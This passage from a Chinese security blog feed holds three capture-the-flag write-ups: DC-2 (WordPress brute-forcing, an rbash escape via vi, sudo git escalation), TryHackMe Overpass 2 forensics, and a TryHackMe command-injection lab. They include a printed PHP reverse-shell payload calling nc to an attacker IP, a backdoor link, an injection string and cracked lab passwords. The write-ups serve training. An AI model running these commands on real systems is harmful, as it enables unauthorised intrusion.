src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200602091635458.png" alt=""><br>枚举用户，发现三个用户admin、jerry、tom</p><pre><code>wpscan --url http://dc-2 -e u</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200602092547987.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""><br>编写帐号文件</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200602093328284.png" alt=""></p><p>用cewl生成密码字典</p><pre><code>cewl http://dc-2/ -w dc2.txt</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200602092931877.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""><br>wpscan爆破wordpress后台,成功得到两对帐号密码</p><p>Username: jerry, Password: adipiscing<br>Username: tom, Password: parturient</p><pre><code>wpscan --url http://dc-2 -U dc2user.txt -P dc2.txt </code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200602093611702.png" alt=""></p><p>wordpress的默认后台地址：url+wp-login.php</p><p>用tom用户登录没发现可利用的地方，但用jerry用户登录发现了第二个flag，要寻找另一个切入点。</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200602100241433.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""></p><h1 id="rbash绕过"><a href="#rbash绕过" class="headerlink" title="rbash绕过"></a>rbash绕过</h1><p>试着用得到帐号密码登录主机，发现jerry用户没权限登录，但是tom可以登录</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200602100812299.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""><br>在tom的家目录发现了第三个flag，但是因为shell不完整查看不了。这时候需要绕过 <a href="https://www.freebuf.com/articles/system/188989.html" target="_blank" rel="noopener">rbash</a>.</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200602101200158.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""></p><p>经过多次试验，发现vi命令可以用,也读取到了第三个flag</p><pre><code>vi 1:set shell =/bin/sh（执行完第一个再执行第二个）:shellexport PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin （设置环境变量）</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020060210222385.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""><br>根据提示查看主机的用户，发现也存在jerry这个用户，试着用前面的密码登录，发现登录成功</p><pre><code>su jerry</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020060210261870.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""></p><h1 id="sudo提权之git"><a href="#sudo提权之git" class="headerlink" title="sudo提权之git"></a>sudo提权之git</h1><p>在jerry用户的家目录下发现第四个flag，根据提示应该是要git提权</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200602103212282.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""><br>发现jerry用户可以不用密码执行git命令，百度了下<a href="https://gtfobins.github.io/gtfobins/git/" target="_blank" rel="noopener">git 提权</a>.，git -p 分页显示命令手册，会调用more这个命令，more这个命令是可以执行sh的</p><pre><code>sudo -l  sudo git -p help config!/bin/sh </code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200602105040232.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""><br>至此5个lag全部拿到</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> 靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tryhackme--Overpass 2 - Hacked</title>
      <link href="/posts/75a2a8e8.html"/>
      <url>/posts/75a2a8e8.html</url>
      
        <content type="html"><![CDATA[<p>日常一篇博客<del>~</del></p><p>今天分享的是tryhackme的一道取证题。</p><h1 id="Task-1-Forensics-Analyse-the-PCAP"><a href="#Task-1-Forensics-Analyse-the-PCAP" class="headerlink" title="Task 1 -Forensics - Analyse the PCAP"></a>Task 1 -Forensics - Analyse the PCAP</h1><h2 id="1-What-was-the-URL-of-the-page-they-used-to-upload-a-reverse-shell"><a href="#1-What-was-the-URL-of-the-page-they-used-to-upload-a-reverse-shell" class="headerlink" title="#1 What was the URL of the page they used to upload a reverse shell?"></a>#1 What was the URL of the page they used to upload a reverse shell?</h2><p>查看http数据包，我们从请求和响应可以知道攻击者的ip：192.168.170.145，服务器的ip：192.168.170.159，并且/development/目录上还有一个upload.php,故答案</p><pre><code>/development/</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201105124627675.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""> <a id="more"></a>)</p><h2 id="2-What-payload-did-the-attacker-use-to-gain-access"><a href="#2-What-payload-did-the-attacker-use-to-gain-access" class="headerlink" title="#2 What payload did the attacker use to gain access?"></a>#2 What payload did the attacker use to gain access?</h2><p>搜索关键字符，发现payload.php,TCP追踪流查看具体发包数据</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201105125110519.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>攻击者利用upload.php新上传了一个payload.php,从内容上看是一个反弹shell<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201105125246107.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><pre><code>&lt;?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.170.145 4242 &gt;/tmp/f")?&gt;</code></pre><h2 id="3-What-password-did-the-attacker-use-to-privesc"><a href="#3-What-password-did-the-attacker-use-to-privesc" class="headerlink" title="#3 What password did the attacker use to privesc?"></a>#3 What password did the attacker use to privesc?</h2><p>继续查看该payload执行了什么命令，TCP追踪流，</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020110512593272.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>该用户从www切换到james用户，密码为：</p><pre><code>whenevernoteartinstant</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201105130253962.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><h2 id="4-How-did-the-attacker-establish-persistence"><a href="#4-How-did-the-attacker-establish-persistence" class="headerlink" title="#4 How did the attacker establish persistence?"></a>#4 How did the attacker establish persistence?</h2><p>继续查看攻击者的攻击命令，发现james可以以任何用户执行任何命令，这个属于配置上的错误。往下看攻击者先是看了/etc/passwd文件，再从github上面下载了一个ssh后门并安装执行。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201105131208668.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><pre><code>https://github.com/NinjaJc01/ssh-backdoor</code></pre><h2 id="5-Using-the-fasttrack-wordlist-how-many-of-the-system-passwords-were-crackable"><a href="#5-Using-the-fasttrack-wordlist-how-many-of-the-system-passwords-were-crackable" class="headerlink" title="#5 Using the fasttrack wordlist, how many of the system passwords were crackable?"></a>#5 Using the fasttrack wordlist, how many of the system passwords were crackable?</h2><p>该服务器一共有5个用户，攻击者现在已经知道james用户的密码，只需破解剩下四个用户的密码即可,在kali使用john爆破也可以。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201105131536805.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201105134803622.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><pre><code>4</code></pre><h1 id="Task-2-Research-Analyse-the-code"><a href="#Task-2-Research-Analyse-the-code" class="headerlink" title="Task 2  Research - Analyse the code"></a>Task 2  Research - Analyse the code</h1><h2 id="1-What’s-the-default-hash-for-the-backdoor"><a href="#1-What’s-the-default-hash-for-the-backdoor" class="headerlink" title="#1 What’s the default hash for the backdoor?"></a>#1 What’s the default hash for the backdoor?</h2><p>查看mian.go<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201105134943511.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><pre><code>bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3</code></pre><h2 id="2-What’s-the-hardcoded-salt-for-the-backdoor"><a href="#2-What’s-the-hardcoded-salt-for-the-backdoor" class="headerlink" title="#2 What’s the hardcoded salt for the backdoor?"></a>#2 What’s the hardcoded salt for the backdoor?</h2><p>求该hash算法的盐<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201105135209814.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><pre><code>1c362db832f3f864c8c2fe05f2002a05</code></pre><h2 id="3-What-was-the-hash-that-the-attacker-used-go-back-to-the-PCAP-for-this"><a href="#3-What-was-the-hash-that-the-attacker-used-go-back-to-the-PCAP-for-this" class="headerlink" title="#3 What was the hash that the attacker used? - go back to the PCAP for this!"></a>#3 What was the hash that the attacker used? - go back to the PCAP for this!</h2><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201105141456802.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><pre><code>6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed</code></pre><h2 id="4-Crack-the-hash-using-rockyou-and-a-cracking-tool-of-your-choice-What’s-the-password"><a href="#4-Crack-the-hash-using-rockyou-and-a-cracking-tool-of-your-choice-What’s-the-password" class="headerlink" title="#4 Crack the hash using rockyou and a cracking tool of your choice. What’s the password?"></a>#4 Crack the hash using rockyou and a cracking tool of your choice. What’s the password?</h2><p>通过算法我们可以知道密码加盐加密成hash，即</p><pre><code>SHA512(password + '1c362db832f3f864c8c2fe05f2002a05') = '6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed'</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201105143517370.png#pic_center" alt=""><br>接下来我们用hashcat爆破密码</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201105144228776.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201105144257270.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><pre><code>november16</code></pre><h1 id="Task-3-Attack-Get-back-in"><a href="#Task-3-Attack-Get-back-in" class="headerlink" title="Task 3  Attack - Get back in!"></a>Task 3  Attack - Get back in!</h1><h2 id="1-The-attacker-defaced-the-website-What-message-did-they-leave-as-a-heading"><a href="#1-The-attacker-defaced-the-website-What-message-did-they-leave-as-a-heading" class="headerlink" title="#1 The attacker defaced the website. What message did they leave as a heading?"></a>#1 The attacker defaced the website. What message did they leave as a heading?</h2><p>访问http服务<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201105145724579.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><pre><code>H4ck3d by CooctusClan</code></pre><h2 id="3-What’s-the-user-flag"><a href="#3-What’s-the-user-flag" class="headerlink" title="#3  What’s the user flag?"></a>#3  What’s the user flag?</h2><p>用ssh后门登录服务器，在james在家目录找到user.txt</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020110514593180.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201105145620710.png#pic_center" alt=""></p><pre><code>thm{d119b4fa8c497ddb0525f7ad200e6567}</code></pre><h2 id="3-What’s-the-root-flag"><a href="#3-What’s-the-root-flag" class="headerlink" title="#3  What’s the root flag?"></a>#3  What’s the root flag?</h2><p>发现一个可疑的suid文件，/home/james/.suid_bash<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201105150615713.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>bash命令的提权方法，不过这个是二进制文件直接执行就好了。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201105151558352.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>执行拿到flag<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201105151126651.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><pre><code>thm{d53b2684f169360bb9606c333873144d}</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> tryhackme </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> 取证 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tryhackme--Injection</title>
      <link href="/posts/75a3a2e8.html"/>
      <url>/posts/75a3a2e8.html</url>
      
        <content type="html"><![CDATA[<h1 id="tryhackme–Injection"><a href="#tryhackme–Injection" class="headerlink" title="tryhackme–Injection"></a>tryhackme–Injection</h1><p>开启环境，用nmap扫描，扫出22，80端口，访问80端口发现一个输入框，可以绕过执行任意命令。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201112102654731.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""><a id="more"></a></p><h1 id="Task-3-Blind-Command-Injection"><a href="#Task-3-Blind-Command-Injection" class="headerlink" title="Task 3  Blind Command Injection"></a>Task 3  Blind Command Injection</h1><h2 id="Ping-the-box-with-10-packets-What-is-this-command-without-IP-address"><a href="#Ping-the-box-with-10-packets-What-is-this-command-without-IP-address" class="headerlink" title="Ping the box with 10 packets.  What is this command (without IP address)?"></a>Ping the box with 10 packets.  What is this command (without IP address)?</h2><pre><code>; ping -c 10</code></pre><p>既然可以执行任意命令我们就反弹一个shell回来<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201112103215382.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><h2 id="Redirect-the-box’s-Linux-Kernel-Version-to-a-file-on-the-web-server-What-is-the-Linux-Kernel-Version"><a href="#Redirect-the-box’s-Linux-Kernel-Version-to-a-file-on-the-web-server-What-is-the-Linux-Kernel-Version" class="headerlink" title="Redirect the box’s Linux Kernel Version to a file on the web server.  What is the Linux Kernel Version?"></a>Redirect the box’s Linux Kernel Version to a file on the web server.  What is the Linux Kernel Version?</h2><p>查看内核版本：uname -a<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201112103311729.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><pre><code>4.15.0-101-</code></pre><h2 id="Enter-“root”-into-the-input-and-review-the-alert-What-type-of-alert-do-you-get"><a href="#Enter-“root”-into-the-input-and-review-the-alert-What-type-of-alert-do-you-get" class="headerlink" title="Enter “root” into the input and review the alert.  What type of alert do you get?"></a>Enter “root” into the input and review the alert.  What type of alert do you get?</h2><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201112103422626.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><pre><code>success</code></pre><h2 id="Enter-“www-data”-into-the-input-and-review-the-alert-What-type-of-alert-do-you-get"><a href="#Enter-“www-data”-into-the-input-and-review-the-alert-What-type-of-alert-do-you-get" class="headerlink" title="Enter “www-data” into the input and review the alert.  What type of alert do you get?"></a>Enter “www-data” into the input and review the alert.  What type of alert do you get?</h2><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201112103509380.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><pre><code>success</code></pre><h2 id="Enter-your-name-into-the-input-and-review-the-alert-What-type-of-alert-do-you-get"><a href="#Enter-your-name-into-the-input-and-review-the-alert-What-type-of-alert-do-you-get" class="headerlink" title="Enter your name into the input and review the alert.  What type of alert do you get?"></a>Enter your name into the input and review the alert.  What type of alert do you get?</h2><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201112103552681.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><pre><code>error</code></pre><p>输入系统中不存在的用户就会报错</p><h1 id="Task-4-Active-Command-Injection"><a href="#Task-4-Active-Command-Injection" class="headerlink" title="Task 4  Active Command Injection"></a>Task 4  Active Command Injection</h1><h2 id="What-strange-text-file-is-in-the-website-root-directory"><a href="#What-strange-text-file-is-in-the-website-root-directory" class="headerlink" title="What strange text file is in the website root directory?"></a>What strange text file is in the website root directory?</h2><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201112103753111.png#pic_center" alt=""></p><pre><code>drpepper.txt</code></pre><h2 id="How-many-non-root-non-service-non-daemon-users-are-there"><a href="#How-many-non-root-non-service-non-daemon-users-are-there" class="headerlink" title="How many non-root/non-service/non-daemon users are there?"></a>How many non-root/non-service/non-daemon users are there?</h2><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201112103913599.png#pic_center" alt=""><br>除了用户之外为0</p><pre><code>0</code></pre><h2 id="What-user-is-this-app-running-as"><a href="#What-user-is-this-app-running-as" class="headerlink" title="What user is this app running as?"></a>What user is this app running as?</h2><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201112104026709.png#pic_center" alt=""></p><pre><code>www-data</code></pre><h2 id="What-is-the-user’s-shell-set-as"><a href="#What-is-the-user’s-shell-set-as" class="headerlink" title="What is the user’s shell set as?"></a>What is the user’s shell set as?</h2><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201112104103748.png#pic_center" alt=""></p><pre><code>/usr/sbin/nologin</code></pre><h2 id="What-version-of-Ubuntu-is-running"><a href="#What-version-of-Ubuntu-is-running" class="headerlink" title="What version of Ubuntu is running?"></a>What version of Ubuntu is running?</h2><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201112104338825.png#pic_center" alt=""></p><pre><code>18.04.4 </code></pre><h2 id="Print-out-the-MOTD-What-favorite-beverage-is-shown"><a href="#Print-out-the-MOTD-What-favorite-beverage-is-shown" class="headerlink" title="Print out the MOTD.  What favorite beverage is shown?"></a>Print out the MOTD.  What favorite beverage is shown?</h2><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201112104613216.png#pic_center" alt=""></p><pre><code>Dr Pepper</code></pre><h1 id="Task-5-Get-The-Flag"><a href="#Task-5-Get-The-Flag" class="headerlink" title="Task 5  Get The Flag!"></a>Task 5  Get The Flag!</h1><h2 id="Get-the-flag"><a href="#Get-the-flag" class="headerlink" title="Get the flag!"></a>Get the flag!</h2><p>使用find命令寻找flag文件</p><pre><code>find / -name *flag*  &gt; 1.txtcat 1.txt</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020111211071196.png#pic_center" alt=""><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201112110741137.png#pic_center" 